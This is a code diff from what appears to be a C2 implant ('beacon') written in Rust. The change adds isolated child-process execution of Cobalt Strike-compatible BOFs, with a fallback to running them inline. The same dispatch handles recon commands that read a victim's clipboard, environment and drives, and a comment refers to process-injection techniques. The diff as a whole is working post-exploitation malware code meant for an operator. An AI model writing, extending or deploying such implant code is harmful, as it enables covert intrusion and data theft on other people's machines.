@@ -1109,7 +1109,24 @@ fn execute_recon(cmd: Command) -> Vec<Response> {
     // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
     // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
     match cmd {
-        Command::Bof { name, args, blob } => vec![crate::bof::run(&name, &args, &blob)],
+        Command::Bof {
+            name,
+            args,
+            blob,
+            isolate,
+        } => {
+            if isolate {
+                // B3: operator-selected isolated execution in a sacrificial
+                // child process (bof-host). Err = PRE-LAUNCH host failure (the
+                // BOF never ran) → WARN-prefixed inline fallback (spec §4-B3).
+                match unsafe { crate::bof::bof_isolated(&blob, &args) } {
+                    Ok(resp) => vec![resp],
+                    Err(e) => vec![bof_inline_fallback(&name, &args, &blob, e)],
+                }
+            } else {
+                vec![crate::bof::run(&name, &args, &blob)]
+            }
+        }
         Command::DriveInfo => vec![crate::recon::do_driveinfo()],
         Command::Env { name } => vec![crate::recon::do_env(&name)],
         Command::Clipboard => vec![crate::recon::do_clipboard()],
@@ -1118,6 +1135,24 @@ fn execute_recon(cmd: Command) -> Vec<Response> {
         // Misroute guard (WP-B2): a routing bug must degrade to an error
         // response, never abort the beacon under panic=abort.
         _ => vec![Response::Err(String::from("misrouted recon command"))],
+    }
+}
+
+/// B3 inline fallback (spec §4-B3): the isolated path failed BEFORE the child
+/// ran, so execute the BOF inline and prefix the output with a WARN so the
+/// operator sees the degradation (pool-party → module-stomp precedent in
+/// inject.rs::do_inject_pool_party).
+fn bof_inline_fallback(name: &str, args: &[String], blob: &[u8], why: &str) -> Response {
+    let mut warn = String::from("WARN: bof isolate failed (");
+    warn.push_str(why);
+    warn.push_str(") — falling back to inline execution. ");
+    match crate::bof::run(name, args, blob) {
+        Response::BofOutput(mut bytes) => {
+            let mut out = warn.into_bytes();
+            out.append(&mut bytes);
+            Response::BofOutput(out)
+        }
+        other => other,
     }
 }
 
